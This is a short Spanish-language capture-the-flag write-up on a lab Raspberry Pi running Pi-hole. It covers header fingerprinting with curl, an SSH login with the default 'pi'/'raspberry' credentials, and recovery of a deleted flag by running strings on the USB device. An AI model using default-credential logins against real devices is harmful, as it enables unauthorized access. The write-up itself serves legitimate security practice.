raspberry 10.10.10.48

Despues de visitar la pagina, esta vacia. no habia codigo que cheque con control U

luego hice un curl para traer el encabezado:
 ``` 
 curl -s -X GET 10.10.10.48 -I
HTTP/1.1 404 Not Found
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Content-Length: 0
Date: Sun, 24 Mar 2024 02:31:03 GMT
Server: lighttpd/1.4.35 
```
Al darnos cuenta de que es un pi-hole

pues utilizamos simplemente las credenciales ssh por defecto
```
ssh pi@10.10.10.48
raspberry
```
Listo, la flag de root fue borrada, despues de buscar en la memoria USB donde dice que la pudo haber dejado tambien fue borrada, entonces hice un string en el mismo usb para ver que quedo, primero con  
df -h  
busque el directorio de la usb y ahi ejecute
```
strings /dev/sdb
```
lo cual me dio la flag.
